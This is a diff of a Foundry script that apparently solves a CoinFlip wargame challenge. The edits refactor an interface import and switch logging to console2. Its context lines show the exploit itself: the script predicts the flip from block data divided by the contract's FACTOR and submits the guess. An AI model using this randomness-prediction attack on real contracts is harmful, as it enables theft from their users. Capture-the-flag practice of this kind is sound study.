@@ -3,14 +3,7 @@
 pragma solidity ^0.8.17;
 
 import "forge-std/Script.sol";
-
-interface ICoinFlip {
-    function consecutiveWins() external view returns (uint256);
-
-    function flip(bool) external returns (bool);
-
-    function FACTOR() external view returns (uint256);
-}
+import {ICoinFlip} from "src/hack/interfaces/ICoinFlip.sol";
 
 contract HackCoinFlipScript is Script {
     function run() external {
@@ -23,9 +16,9 @@ contract HackCoinFlipScript is Script {
         uint256 flip = blockValue / factor;
         bool guess = (flip == 1);
         coinFlip.flip(guess);
-        console.log(coinFlip.consecutiveWins());
+        console2.log(coinFlip.consecutiveWins());
 
         vm.stopBroadcast();
-        console.log("SUCCESS!!! Submit the instance.");
+        console2.log("SUCCESS!!! Submit the instance.");
     }
 }
